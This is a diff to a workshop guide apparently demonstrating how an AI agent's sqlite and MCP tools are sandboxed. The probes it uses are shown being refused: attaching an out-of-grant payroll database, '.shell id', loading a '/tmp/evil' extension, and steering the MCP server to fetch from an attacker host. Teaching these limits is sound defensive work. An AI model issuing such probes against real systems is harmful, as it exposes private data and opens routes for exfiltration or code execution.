@@ -50,7 +50,7 @@ In Codespaces, run the `./ask` command under it instead.
 
 **1. Ordinary SQL works** 
 
-In the chat:
+In the chat (not Codespaces):
 
 ```chat
 sqlite select title, speaker from talks where track = 'Security' order by title
@@ -71,7 +71,7 @@ The SQLite engine reads the talks database.
 
 **2. A dot-command works** 
 
-In the chat:
+In the chat (not Codespaces):
 
 ```chat
 sqlite .tables
@@ -89,7 +89,7 @@ The tool's shell turns `.tables` into a query on SQLite's schema table.
 
 **3. ATTACH a database inside the grant: it works**
 
-In the chat:
+In the chat (not Codespaces):
 
 ```chat
 sqlite attach 'file:/data/rooms.db?immutable=1' as r; select name, seats from r.rooms
@@ -108,7 +108,7 @@ takes no locks, which a read-only folder can't hold.
 
 **4. ATTACH a database outside the grant: refused**
 
-In the chat:
+In the chat (not Codespaces):
 
 ```chat
 sqlite attach 'file:/workshop/private-data/payroll.db?immutable=1' as p; select name, salary from p.salaries
@@ -137,7 +137,7 @@ sqlite3 databases/talks.db \
 
 **5. .shell has nothing to start** 
 
-In the chat:
+In the chat (not Codespaces):
 
 ```chat
 sqlite .shell id
@@ -156,7 +156,7 @@ message is the tool's choice. The reason it couldn't do otherwise is below.
 
 **6. load_extension doesn't exist** 
 
-In the chat:
+In the chat (not Codespaces):
 
 ```chat
 sqlite select load_extension('/tmp/evil')
@@ -223,7 +223,7 @@ In Codespaces, run the `./ask` command under it instead.
 
 **7. List the MCP server's tools**
 
-In the chat:
+In the chat (not Codespaces):
 
 ```chat
 mcp tools
@@ -241,7 +241,7 @@ The `mcp` tool asks the server for its tools. The server answers with four: `lis
 
 **8. Call one**
 
-In the chat:
+In the chat (not Codespaces):
 
 ```chat
 mcp call list_talks {"track":"Security"}
@@ -259,7 +259,7 @@ The MCP server turns the call into `GET /talks?track=Security` on the talks serv
 
 **9. A write goes through the service**
 
-In the chat:
+In the chat (not Codespaces):
 
 ```chat
 mcp call favorite_talk {"id":1}
@@ -277,7 +277,7 @@ The talks service marks the talk a favorite in its own folder. Neither the MCP s
 
 **10. Skip the MCP server: refused**
 
-In the chat:
+In the chat (not Codespaces):
 
 ```chat
 mcp --server http://talks.mock-sites.svc/talks tools
@@ -295,7 +295,7 @@ The talks service is on the network and would answer, but it isn't in the `mcp` 
 
 **11. Talk the MCP server into fetching elsewhere: refused**
 
-In the chat:
+In the chat (not Codespaces):
 
 ```chat
 mcp call import_talks {"url":"http://attacker.mock-sites.svc/collect"}
